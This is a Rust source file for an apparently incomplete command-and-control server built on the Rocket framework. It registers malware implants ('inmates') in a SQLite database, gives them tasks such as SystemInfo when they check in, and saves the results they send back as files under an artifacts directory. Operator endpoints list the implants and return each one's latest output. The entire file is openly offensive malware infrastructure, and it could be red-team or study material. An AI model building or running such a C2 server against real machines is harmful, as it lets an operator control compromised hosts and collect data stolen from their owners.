extern crate Justice;
#[macro_use] extern crate rocket;
use rocket::serde::{Deserialize, Serialize, json::Json};
use Justice::actions::c2_actions;
use serde_json;
use Justice::CheckInResponse;
use Justice::PostRequest;
use Justice::Inmate;
use Justice::PostRequestHeaders;
use rusqlite::{Connection, Result, params};
use std::time::SystemTime;
use std::fs;
mod db;
use db::{implant_exists, update_database, get_all_inmates, create_db};

#[get("/")]
fn index() -> &'static str {
    "Hello, world!"
}

#[post("/c2/<implant_id>", data = "<c2_request>")]
fn handle_c2_request(implant_id: u32, c2_request: Json<PostRequest>) -> &'static str {
    /* TODO */
    match implant_exists(implant_id) {
        Ok(inmate) => {
            let request = c2_request.into_inner();
            let request_headers = PostRequestHeaders {
                timestamp: request.timestamp,
                action_type: request.action_type,
                action_parameters: request.action_parameters,
            };

            let mut new_inmate = inmate.clone();
            new_inmate.completed_actions.push(request_headers);
            update_database(new_inmate);
            
            //println!("{} performed action {:?}, result: {}", implant_id, request.action_type, String::from_utf8(&request.content).unwrap());
            let timestamp = &request.timestamp;
            let dir_path = format!("artifacts/{}/{}", implant_id, &request.action_type.to_string());
            fs::create_dir_all(&dir_path).unwrap();
            let file_path = format!("{}/{}", dir_path, timestamp);
            fs::write(file_path, request.content).unwrap();

        }
        Err(_) => {
            println!("Unknown implant tried to post, id: {}", implant_id);
        }
    }
    return "ok";
}

#[get("/c2/<implant_id>")] 
fn get_c2_request(implant_id: u32) -> Json<CheckInResponse> {
    
    match implant_exists(implant_id) {
        Ok(inmate) => {

            let mut new_inmate = inmate.clone();

            let response = CheckInResponse {
                task: inmate.pending_instruct_type,
                task_parameters: inmate.pending_instruct,
            };
            if !(response.task == c2_actions::Wait) {
                new_inmate.request_actions.push(response.clone());
            }

            update_database(new_inmate);

            return Json(response);
        }
        Err(_) => {
            let conn = Connection::open("prisoninmates.db").unwrap();
            let _ = conn.execute(
                "INSERT INTO inmates (rowid, os, hostname, ip, pid, last_checkin, pending_instruct, pending_instruct_type) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
                params![implant_id, "Unknown", "Unknown", "TBD", 1234, SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(), "", "SystemInfo"]
            );
            println!("Implant registered id: {}", implant_id);
            fs::create_dir_all(format!("artifacts/{}", implant_id)).unwrap();
            return Json(CheckInResponse {
                task: c2_actions::Wait,
                task_parameters: "".to_string(),
            });
        }
    }
}

#[get("/operator")]
fn operator_panel() -> Json<String> {
    let all_inmates = get_all_inmates();

    return Json(serde_json::to_string(&all_inmates).unwrap());
}

#[get("/operator/<implant_id>")]
fn operator_panel_specific(implant_id: u32) -> Json<String> {
    let inmate = implant_exists(implant_id);
    match inmate {
        Ok(inmate) => {
            return Json(serde_json::to_string(&inmate).unwrap());
        }
        Err(_) => {
            return Json("Does not exist".to_string());
        }
    }
}

#[get("/operator/<implant_id>/recent")]
fn operator_panel_specific_recent(implant_id: u32) -> Result<Json<PostRequest>, Json<String>> {
    let inmate = implant_exists(implant_id);
    match inmate {
        Ok(inmate) => {
            let recent_action = inmate.completed_actions.last();
            match recent_action {
                Some(action) => {
                    let file_path = format!("artifacts/{}/{}/{}", implant_id, action.action_type.to_string(), action.timestamp);
                    match fs::read(&file_path) {
                        Ok(content) => {
                            Ok(Json(PostRequest {
                                timestamp: action.timestamp,
                                action_type: action.action_type,
                                action_parameters: action.action_parameters.clone(),
                                content,
                            }))
                        },
                        Err(_) => Err(Json("Failed to read the file containing output, check permissions".to_string())),
                    }
                }
                None => Err(Json("No recent action found".to_string())),
            }
        }
        Err(_) => {
            Err(Json("Does not exist".to_string()))
        }
    }
}

#[post("/operator", data = "<request>")]
fn operator_panel_post(request: Json<String>) -> &'static str {
    let apiRequest = request.into_inner();
    "Ok"
}
 
#[launch]
fn rocket() -> _ {
    create_db();
    rocket::build()
        .mount("/", routes![index])
        .mount("/", routes![handle_c2_request])
        .mount("/", routes![get_c2_request])
        .mount("/", routes![operator_panel])
        .mount("/", routes![operator_panel_specific])
        .mount("/", routes![operator_panel_post])
        .mount("/", routes![operator_panel_specific_recent])
}